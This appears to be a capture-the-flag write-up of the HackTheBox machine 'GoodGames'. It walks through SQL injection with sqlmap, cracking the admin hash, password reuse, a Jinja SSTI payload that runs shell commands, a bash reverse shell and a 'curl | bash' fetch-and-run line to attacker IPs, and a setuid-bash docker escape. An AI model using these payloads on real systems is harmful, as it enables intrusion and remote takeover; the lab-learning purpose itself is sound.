---
title: HTB [GoodGames]
date: 2023-01-25 01:28:05 +0200
categories: [linux,sqli,password-reuse,ssti,docker-escape]
tags: [HACKTHEBOX MACHINES]
excerpt: GoodGames is an easy hackthebox machine that created by TheCyberGeek, which involves sqli in a login page to get a easily crackable hash, After logging in as admin we can see the Flask Volt service running on a different host. They've used same password for both hosts, so we can login there as admin and do a ssti to get initial shell, but it was a docker container and they've mounted the /home/<user> directory to that, so we can do a interesting method to privesc frome there
---


![](https://i.imgur.com/EfqCSt7.png)

## Recon

### port scan

```js
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.51
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
|_http-favicon: Unknown favicon MD5: 61352127DC66484D3736CACCF50E7BEB
|_http-title: GoodGames | Community and Store
Service Info: Host: goodgames.htb
```

- Only a single port opened o.O
- Ok let's enum the website and scan for UDP ports in the background
- Add `goodgames.htb` to your `/etc/hosts` file

### web enum

- It's a flask application

![](https://i.imgur.com/TjldMp1.png)

<br>
- There's a signup page, let's create a new account and login

![](https://i.imgur.com/8WJJgWc.png)

- My name and email are reflecting here, so let's try for a SSTI

![](https://i.imgur.com/I21HlnV.png)

- There's no SSTI in username & email field

#### Forget password

![](https://i.imgur.com/O6r12TZ.png)

- It works normally

### SQLi

- SSTI not worked here, so let's try for SQL Injection

```js
sqlmap -u "http://goodgames.htb/login" --method=POST --data "email=a&password=a"
```

![](https://i.imgur.com/jei3zLo.png)

- Cool let's dump the db

```js
available databases [2]:
[*] information_schema
[*] main
```

- Let's use the main database

```js
[3 tables]
+---------------+
| user          |
| blog          |
| blog_comments |
+---------------+
```

- user seems interesting

```js
[4 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| email    | varchar(255) |
| id       | int          |
| name     | varchar(255) |
| password | varchar(255) |
+----------+--------------+
```

- Dump all these things

```js
+----+---------+---------------------+----------------------------------+
| id | name    | email               | password                         |
+----+---------+---------------------+----------------------------------+
| 1  | admin   | admin@goodgames.htb | 2b22337f218b2d82dfc3b6f77e7cb8ec |
| 2  | test    | test@test.com       | 098f6bcd4621d373cade4e832627b4f6 |
| 3  | {{8*8}} | {{7*7}}@gmail.com   | f2750fc6d623392c1c8ad1d9d18f7ea5 |
| 4  | {{8*8}} | one@gmail.com       | f2750fc6d623392c1c8ad1d9d18f7ea5 |
| 5  | {{8*8}} | two@gmail.com       | 098f6bcd4621d373cade4e832627b4f6 |
| 6  | {{8*8}} | {{8*8}}@gmail.com   | 098f6bcd4621d373cade4e832627b4f6 |
+----+---------+---------------------+----------------------------------+
```

- only the first one is in the box, other 5 accounts are mine, used to check ssti
- let's crack the hash `2b22337f218b2d82dfc3b6f77e7cb8ec`

![](https://i.imgur.com/7kaDX72.png)

- login with these creds `admingoodgames.htb:superadministrator`

![](https://i.imgur.com/OMtOOnW.png)

- There's a settings button in the profile page, it's not available for normal users
- And clicking that redirects us to `http://internal-administration.goodgames.htb/`
- Let's add this to our `/etc/hosts` file

## Shell

#### Internal-Administration

![](https://i.imgur.com/wpGG3VN.png)

- Let's use the password that we got from the sqli, `admin:superadministrator` 

![](https://i.imgur.com/iQqpODo.png)

- Successfully logged in

![](https://i.imgur.com/lqMECXH.png)

- In settings pannel we can able to do a SSTI

```python
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("id").read() }}
```

![](https://i.imgur.com/ndI9WbM.png)

- Now let's try to get a rev shell
- The output says `uid = 0 (root)` so most likely it's a docker container
- Start a python server and serve a file named shell.sh

```bash
bash -c 'exec bash -i &>/dev/tcp/10.10.14.3/1337 <&1' 
```

```python
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("curl 10.10.16.9/shell.sh | bash").read() }}
```

![](https://i.imgur.com/Ekeegqz.png)

- As I said earlier, we got shell as a docker container
- There's a user named `augustus`, you can grab the user.txt file from his home folder

## Privesc

![](https://i.imgur.com/rHNySlg.png)

- `.2` is the docker IP, and `.1` is always the host and it's the machine IP
- I'm going to upload a static nmap binary to scan all the internal ports of that IP
- Here is the link to download that [binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap)

![](https://i.imgur.com/vSrnhtf.png)

- Looks like firewall blocking us to access ssh, but we can access it from the docker

![](https://i.imgur.com/cyq4WmE.png)

- It's a guess that both machines have the same user called `augustus`, using the same password allows us to ssh into the host machine
- Enumerating the machine gives us nothing
- I've checked for all services, nothing seems interesting
- But it's wiered that we got the users home directory in the docker container
- Seems the file system is mounted with it
- Logout us augustus and go back to the docker container
- Create a `id_rsa` file using `ssh-keygen` command
- But that method failed, coz the root folder is for docker it's not mounted (See #beyond root part for more understanding)
- So let's copy the bash binary to our `agustus` home folder and give `u+s` (setuid) permissions for that

```
cp /bin/bash .
```
- Do this us `augustus`
- Then go back to the docker container

```
chown root:root /home/augustus/bash
chmod u+s /home/augustus/bash
```
- Do this as root user in docker container

![](https://i.imgur.com/3WgCFNL.png)

- Now `./bash -p` for the root
- Really It's a good game as the name of the machine

### Beyond root

- Let's go back to the docker container and chek for the mounted folders, run the command `mount`

![](https://i.imgur.com/4kXzzVb.png)

- Looks like the home folder of the `augustus` is mounted to the docker container 
- That's why we can able to change the permissions of the bash binary that has been copied to `augustus`' home folder
- Hope you've liked this writeup, cya soon :)
